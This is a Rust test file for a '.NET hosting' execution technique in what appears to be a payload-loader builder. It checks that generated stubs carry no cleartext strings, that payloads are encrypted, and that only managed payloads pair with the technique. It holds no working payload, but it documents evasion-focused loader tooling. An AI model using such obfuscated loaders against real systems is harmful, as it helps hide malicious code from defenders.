//! Tests for the .NET-hosting technique.

use super::*;
use crate::engine::obfuscation::StringsConfig;

/// The technique's metadata is well formed and carries the two capabilities.
#[test]
fn def_is_well_formed() {
    assert_eq!(DEF.name, "dotnet_hosting");
    assert_eq!(DEF.category, Category::Execution);
    assert!(DEF.requires.contains(&Capability::WindowsX64));
    assert!(DEF.requires.contains(&Capability::WindowsX86));
    assert!(DEF.syscalls.is_empty(), "the CLR issues no Nt* call");
    // Read through a binding: asserting on the constant directly is what clippy
    // (rightly) rejects as a no-op.
    let resolves_imports = DEF.resolves_imports;
    assert!(
        !resolves_imports,
        "the managed image's imports belong to the CLR"
    );
    assert!(DEF.conflicts.is_empty());
}

/// The fragment compiles as Rust once its placeholders are substituted: a
/// leftover `$X$` is not valid Rust, and a missing substitution would only
/// surface when a stub is compiled.
#[test]
fn every_placeholder_is_substituted() {
    let rendered =
        Params {}.render_fragment(&StringsConfig::from_yaml(None).expect("default strings"));
    assert!(
        !rendered.contains('$'),
        "unsubstituted placeholder in the rendered fragment"
    );
    assert!(rendered.contains("fn execute_payload"));
}

/// The CLR version and the environment variable name go through the string
/// configuration, so neither appears in cleartext in the generated stub.
#[test]
fn the_runtime_strings_are_obfuscated() {
    let rendered =
        Params {}.render_fragment(&StringsConfig::from_yaml(None).expect("default strings"));
    assert!(!rendered.contains("v4.0.30319"));
    assert!(!rendered.contains("COMPLUS_Version"));
    assert!(!rendered.contains("could not create the runtime host"));
}

/// The fragment must not reach for a string literal at runtime: everything the
/// stub says is rebuilt from the obfuscated data.
#[test]
fn fragment_has_no_cleartext_diagnostics() {
    for (_, text) in MESSAGES {
        assert!(
            !DEF.stub_fragment.contains(text),
            "cleartext diagnostic in the fragment: {text}"
        );
    }
    assert!(!DEF.stub_fragment.contains("v4.0.30319"));
}

/// A plan that pairs `dotnet_hosting` with a managed payload is accepted, and
/// the implied-by-each-other rules reject the mismatches.
#[test]
fn format_and_technique_imply_each_other() {
    let managed = |format: &str, technique: &str| {
        format!(
            r#"
schema: 4
name: managed-test
build:
  payload:
    source: ./payload.exe
    format: {format}
    crypto:
      algo: xchacha20poly1305
      key: random
  output:
    path: ./dist/out.exe
    arch: x64
    strip: true
    trim_paths: all
runtime:
  - technique: {technique}
"#
        )
    };

    let plan: crate::plan::schema::Plan =
        serde_yml::from_str(&managed("dotnet", "dotnet_hosting")).expect("valid YAML");
    crate::plan::validate::validate(&plan).expect("dotnet + dotnet_hosting is valid");

    let plan: crate::plan::schema::Plan =
        serde_yml::from_str(&managed("dotnet", "reflective_loading")).expect("valid YAML");
    let err = crate::plan::validate::validate(&plan).expect_err("a managed image is not mapped");
    assert!(err.to_string().contains("dotnet_hosting"), "unclear: {err}");

    let plan: crate::plan::schema::Plan =
        serde_yml::from_str(&managed("pe", "dotnet_hosting")).expect("valid YAML");
    let err = crate::plan::validate::validate(&plan).expect_err("hosting needs a managed payload");
    assert!(err.to_string().contains("format: dotnet"), "unclear: {err}");
}

/// Canary for the raw `VARIANT` layout the fragment writes through. It cannot
/// be asserted from here — the fragment is a template compiled only inside a
/// stub, where its own `const` assertion catches a mismatch — so this pins the
/// numbers a future `windows` update would change.
#[test]
fn the_variant_layout_is_what_the_fragment_assumes() {
    use windows::core::VARIANT;
    use windows::Win32::System::Variant::VT_I4;

    let size = std::mem::size_of::<VARIANT>();
    let probe = VARIANT::from(0x1234_5678i32);
    let base = probe.as_raw() as *const _ as *const u8;
    let bytes: Vec<u8> = unsafe { (0..size).map(|i| *base.add(i)).collect() };
    let needle = 0x1234_5678i32.to_le_bytes();
    let offset = bytes
        .windows(4)
        .position(|w| w == needle)
        .expect("the lVal is inside the VARIANT bytes");

    assert_eq!(
        u16::from_le_bytes([bytes[0], bytes[1]]),
        VT_I4.0,
        "the tag sits at offset 0"
    );
    assert_eq!(
        offset, 8,
        "the value union starts after the tag and three words"
    );
    // `windows_core::VARIANT` is padded to `DECIMAL`: 24 bytes on x64, 16 on x86.
    let expected = if cfg!(target_arch = "x86_64") { 24 } else { 16 };
    assert_eq!(
        size, expected,
        "the fragment's raw view must cover the whole VARIANT"
    );
}
